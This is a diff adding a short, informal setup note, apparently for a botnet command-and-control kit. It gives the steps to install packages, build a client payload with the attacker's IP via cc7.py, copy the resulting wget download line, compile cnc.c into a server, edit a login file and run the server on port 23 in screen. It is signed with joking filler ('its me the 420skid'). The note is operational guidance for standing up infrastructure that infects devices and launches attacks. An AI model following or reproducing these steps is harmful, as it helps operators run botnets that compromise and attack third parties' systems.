@@ -1,0 +1,24 @@
+wewewewewewewewewewe
+
+
+yum install python python-paramiko screen gcc nano perl perl-CPAN -y
+
+go to client and change (ip) and (port)
+
+python cc7.py client.c ip
+
+copy wget.
+
+gcc cnc.c -o server -pthread
+
+ls
+
+nano login.txt
+
+screen ./server 23 1000 47
+
+
+lolllllllllllll its me the 420skid
+
+
+
